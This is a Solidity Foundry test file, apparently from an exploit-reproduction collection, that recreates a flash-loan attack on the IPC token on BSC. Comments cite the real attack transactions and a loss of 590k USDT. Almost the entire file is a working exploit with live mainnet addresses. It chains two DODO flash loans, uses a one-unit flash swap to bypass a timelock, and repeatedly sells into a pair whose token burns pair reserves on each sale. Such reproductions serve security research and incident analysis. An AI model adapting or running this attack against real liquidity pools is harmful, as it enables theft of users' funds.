// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

// reason : To pump the price ,every sell will burn pairs token, that is terrible!
// guy    : https://x.com/TenArmorAlert/status/1876663900663370056
// tx     : https://app.blocksec.com/explorer/tx/bsc/0x5ef1edb9749af6cec511741225e6d47103e0b647d1e41e08649caaff66942a91?line=30 -->front run
//        : https://app.blocksec.com/explorer/tx/bsc/0x3a3683119e1801821faa15c319cb9c8fb3fcf6ee92b1904a829d82c432e09a44?line=24 -->poor guys 
// total loss : 590k usdt XD

contract ContractTest is Test {
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    address dvm1 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;
    address dvm2 = 0x0e15e47C3DE9CD92379703cf18251a2D13E155A7;
    IERC20 IPC = IERC20(0xEAb0d46682Ac707A06aEFB0aC72a91a3Fd6Fe5d1);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xDe3595a72f35d587e96d5C7B6f3E6C02ed2900AB);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    uint256 borrow_1 = 256285582578788161478508;
    uint256 borrow_2 = 77794276765052816860394;

    function setUp() external {
        cheats.createSelectFork("bsc", 45561316 - 1);
        // attacker buy sor
        deal(address(this),0);
        deal(address(USDT),address(this),0);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Begin] USDT balance before", USDT.balanceOf(address(this)), 18);
        

        (bool success,) = dvm1.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, borrow_1, address(this), "1"));
        require(success, "flashloan failed");

        emit log_named_decimal_uint("[End] USDT balance after", USDT.balanceOf(address(this)), 18);
    }

    function dodoCall(address a, uint256 b, uint256 c, bytes memory d) public {
        console.log(msg.sender);
        if(msg.sender == address(dvm1)){
            (bool success,) = dvm2.call(abi.encodeWithSignature("flashLoan(uint256,uint256,address,bytes)", 0, borrow_2, address(this), "1"));
            require(success, "flashloan failed");
            USDT.transfer(address(dvm1), borrow_1);
        }

        if(msg.sender == address(dvm2)){
            console.log("Pair balance",IPC.balanceOf(address(pair)));
            console.log("USDT balance",USDT.balanceOf(address(this)));
            
            address[] memory path = new address[](2);

            
            for(uint i = 0; i < 16; i++) {
                path[0] = address(USDT);
                path[1] = address(IPC);
                uint256 usdtAmount = USDT.balanceOf(address(this)) - 10;
                uint256[] memory values = router.getAmountsOut(usdtAmount, path);

                //为了绕过时间锁的检查，同步换1 usdt出来
                pair.swap(1, values[1], address(this), abi.encode(usdtAmount));

                // 将IPC全部换成USDT
                IPC.approve(address(router), type(uint256).max);
                path[0] = address(IPC); 
                path[1] = address(USDT);
                router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    IPC.balanceOf(address(this)),
                    0,
                    path,
                    address(this),
                    block.timestamp
                );
                
                path[0] = address(USDT);
                path[1] = address(IPC);
            }

            
            USDT.transfer(address(dvm2), borrow_2);
        }
    }

    function pancakeCall(address, uint256, uint256 amount1, bytes memory data) public {
        uint256 usdt_amount = abi.decode(data, (uint256));
        console.log("USDT transferd",usdt_amount);
        //多换了1 usdt，所以多还1个
        USDT.transfer(address(pair), usdt_amount+1);
    }
        

    function DVMFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        dodoCall(sender, baseAmount, quoteAmount, data);
    }

    receive() external payable {}
}
